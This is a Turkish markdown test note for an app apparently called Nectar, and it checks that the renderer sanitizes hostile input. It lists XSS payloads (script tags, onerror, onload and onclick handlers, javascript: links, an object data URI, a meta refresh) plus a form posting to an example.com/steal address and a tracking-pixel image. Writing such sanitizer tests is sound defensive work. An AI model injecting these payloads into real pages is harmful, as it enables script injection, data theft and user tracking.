# Güvenlik testi ⚠️

Bu notun **hiçbir** satırı Nectar'da kod çalıştırmamalı, uyarı penceresi açmamalı
ya da dışarıya istek göndermemeli. Hepsi temizlenmiş (sanitize) olarak görünmeli veya hiç görünmemeli.

<script>alert("XSS: script etiketi çalıştı")</script>

<img src="x" onerror="alert('XSS: onerror çalıştı')">

<a href="javascript:alert('XSS: javascript linki')">Tıklarsan hiçbir şey olmamalı</a>

[Markdown javascript linki](javascript:alert('XSS'))

<iframe src="https://example.com"></iframe>

<svg onload="alert('XSS: svg onload')"><circle r="10"/></svg>

<div onclick="alert('XSS: onclick')">Bu div'e tıklamak bir şey yapmamalı</div>

<style>body { display: none !important; }</style>

<form action="https://example.com/steal" method="post"><input name="x" value="veri"><button>Gönder</button></form>

<object data="data:text/html,<script>alert('XSS: object')</script>"></object>

<meta http-equiv="refresh" content="0; url=https://example.com">

Dış görsel (izinsiz ağ isteği yapmamalı ya da açıkça izin istenmeli):
![dış görsel](https://example.com/izleme-pikseli.png)
